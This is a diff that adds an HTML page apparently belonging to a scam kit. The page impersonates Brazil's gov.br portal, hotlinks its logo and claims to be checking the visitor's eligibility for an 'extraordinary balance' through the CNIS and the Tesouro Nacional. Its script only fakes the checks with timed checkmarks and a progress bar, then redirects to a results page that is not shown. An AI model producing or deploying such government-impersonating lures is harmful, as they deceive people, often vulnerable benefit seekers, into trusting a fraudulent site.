@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portal Gov - Validando Benefício</title>
+    <style>
+        body { font-family: 'Arial', sans-serif; background-color: #f2f3f7; margin: 0; padding: 0; display: flex; flex-direction: column; min-height: 100vh; }
+        
+        .gov-bar { background: #004088; color: white; padding: 10px 5%; display: flex; align-items: center; justify-content: space-between; font-size: 11px; font-weight: bold; }
+        .nav-main { background: white; padding: 15px 5%; border-bottom: 2px solid #1351b4; display: flex; align-items: center; gap: 15px; }
+        .nav-main img { height: 35px; }
+
+        .container { max-width: 500px; margin: 40px auto; padding: 0 20px; flex: 1; }
+        
+        .loading-card { background: white; border-radius: 8px; padding: 30px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); text-align: center; }
+        
+        h2 { color: #1351b4; font-size: 20px; margin-bottom: 20px; }
+        
+        .status-list { text-align: left; margin-bottom: 30px; }
+        .status-item { display: flex; align-items: center; gap: 10px; margin-bottom: 15px; font-size: 14px; color: #666; }
+        .status-item.active { color: #1351b4; font-weight: bold; }
+        .status-item.done { color: #1d8032; }
+
+        /* Barra de Progresso Animada */
+        .progress-container { background: #eee; border-radius: 10px; height: 12px; width: 100%; margin: 20px 0; overflow: hidden; }
+        .progress-bar { background: #1351b4; height: 100%; width: 0%; transition: width 0.5s; }
+
+        .check-icon { width: 18px; height: 18px; border: 2px solid #ddd; border-radius: 50%; display: inline-block; }
+        .done .check-icon { background: #1d8032; border-color: #1d8032; }
+        .done .check-icon::after { content: '✓'; color: white; font-size: 12px; display: block; text-align: center; }
+
+        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #1351b4; border-radius: 50%; width: 16px; height: 16px; animation: spin 1s linear infinite; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+<div class="gov-bar">
+    <span>BRASIL.GOV.BR</span>
+    <span>SISTEMA DE CHECAGEM NACIONAL</span>
+</div>
+
+<div class="nav-main">
+    <img src="https://www.gov.br/governodigital/pt-br/estatisticas-e-indicadores-do-governo-digital/logo-gov-br/image" alt="Gov.br">
+    <div style="border-left: 1px solid #ddd; padding-left: 15px; color: #1351b4; font-weight: bold;">VALIDAÇÃO DE DADOS</div>
+</div>
+
+<div class="container">
+    <div class="loading-card">
+        <h2>Analisando Elegibilidade...</h2>
+        <p style="font-size: 13px; color: #777;">Aguarde enquanto consultamos o Cadastro Nacional de Informações Sociais (CNIS).</p>
+
+        <div class="progress-container">
+            <div class="progress-bar" id="bar"></div>
+        </div>
+
+        <div class="status-list">
+            <div class="status-item" id="step1"><div class="spinner"></div> Verificando vínculo previdenciário...</div>
+            <div class="status-item" id="step2"><div class="check-icon"></div> Consultando saldo extraordinário...</div>
+            <div class="status-item" id="step3"><div class="check-icon"></div> Cruzando dados com o Tesouro Nacional...</div>
+            <div class="status-item" id="step4"><div class="check-icon"></div> Liberando cronograma de pagamento...</div>
+        </div>
+    </div>
+</div>
+
+<script>
+    const steps = [
+        { id: 'step1', time: 1500, bar: '25%' },
+        { id: 'step2', time: 3000, bar: '50%' },
+        { id: 'step3', time: 5000, bar: '75%' },
+        { id: 'step4', time: 7000, bar: '100%' }
+    ];
+
+    steps.forEach((step, index) => {
+        setTimeout(() => {
+            const el = document.getElementById(step.id);
+            el.className = 'status-item done';
+            el.innerHTML = '<div class="check-icon"></div>' + el.innerText;
+            document.getElementById('bar').style.width = step.bar;
+            
+            if(index === steps.length - 1) {
+                setTimeout(() => {
+                    window.location.href = "resultado_14.html";
+                }, 1000);
+            }
+        }, step.time);
+    });
+</script>
+
+</body>
+</html>
